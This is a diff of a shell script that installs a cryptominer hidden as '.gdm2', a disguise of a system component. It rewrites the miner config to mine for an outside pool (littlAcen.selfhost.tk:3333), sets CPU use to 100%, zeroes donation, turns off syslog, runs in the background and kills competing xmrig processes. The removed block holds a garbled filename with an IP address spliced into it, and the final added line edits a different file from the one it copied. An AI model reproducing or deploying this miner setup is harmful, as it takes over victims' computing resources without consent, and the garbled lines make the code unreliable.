@@ -230,20 +230,6 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:3333",/' $HOME/.gdm2/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "hv",/' $HOME/.gdm2/config.json
-sed -i 's/"tls-fingerprint": null,/"tls-fingerprint": "0763bdd689bf1940a75eb46d209704dde4dcc26dbdfa2aefd050c79fee3377ee",/' $HOME/.gdm2/config.json
-sed -i 's/"enabled": false,/"enabled": true,/' $HOME/.gdm2/config.json
-sed -i 's/"donate-level": 1,/"donate-level": 0,/' $HOME/.gdm2/config.json
-sed -i 's/"donate-over-proxy": 1,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.jso185.194.143.46n
-
-cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
-
 # preparing script
 
 killall xmrig
@@ -332,6 +318,20 @@ else
 fi
 
 modprobe msr
+
+sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:3333",/' $HOME/.gdm2/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "hv",/' $HOME/.gdm2/config.json
+sed -i 's/"tls-fingerprint": null,/"tls-fingerprint": "0763bdd689bf1940a75eb46d209704dde4dcc26dbdfa2aefd050c79fee3377ee",/' $HOME/.gdm2/config.json
+sed -i 's/"enabled": false,/"enabled": true,/' $HOME/.gdm2/config.json
+sed -i 's/"donate-level": 1,/"donate-level": 0,/' $HOME/.gdm2/config.json
+sed -i 's/"donate-over-proxy": 1,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
+
+cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
+sed -i 's/"background": false,/"background": true,/' $HOME/.gdm2/config.json
 
 echo ""
 
